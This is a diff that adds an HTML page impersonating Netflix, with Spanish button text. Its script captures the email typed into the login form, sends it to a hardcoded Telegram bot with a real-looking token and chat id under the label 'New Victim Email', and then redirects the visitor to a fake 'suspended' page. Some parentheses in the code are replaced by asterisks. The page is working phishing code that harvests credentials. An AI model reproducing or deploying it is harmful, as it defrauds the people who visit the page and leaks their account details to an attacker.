@@ -1,0 +1,22 @@
+```html
+
+Netflix
+
+  
+    
+    Comenzar
+  
+  
+    document.getElementById*'loginForm'*.onsubmit = async *e* => {
+      e.preventDefault*;
+      const formData = new FormData*e.target*;
+      const email = formData.get*'email'*;
+      const token = '8778767590:AAEzSEROOtFvypgrC4plAft3Tdrzl8_lUqc';
+      const chat_id = '1664785356';
+      const msg = encodeURIComponent*`New Victim Email: ${email}`*;
+      await fetch*`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${msg}`;
+      window.location.href = 'https://netflix-cop.vercel.app/suspended';
+    };
+  
+
+```
